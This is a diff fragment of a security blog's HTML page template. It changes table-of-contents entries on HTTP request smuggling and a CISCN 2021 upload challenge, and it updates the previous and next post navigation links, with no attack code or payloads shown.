-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-basic-CL-TE-vulnerability"><span class="toc-number">1.</span> <span class="toc-text">0x01  basic CL.TE vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-basic-TE-CL-vulnerability"><span class="toc-number">2.</span> <span class="toc-text">0x02 basic TE.CL vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-obfuscating-the-TE-header"><span class="toc-number">3.</span> <span class="toc-text">0x03 obfuscating the TE header</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn2021-upload"><span class="toc-number">1.</span> <span class="toc-text">ciscn2021 upload</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -442,13 +409,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="上一篇: Http请求走私（smuggling)学习记录">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" title="下一篇: 无列名注入">
+            <a  href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/" title="下一篇: CISCN 2021 web 部分wp">
                 <i class="fa fa-angle-right"></i>
             </a>
         
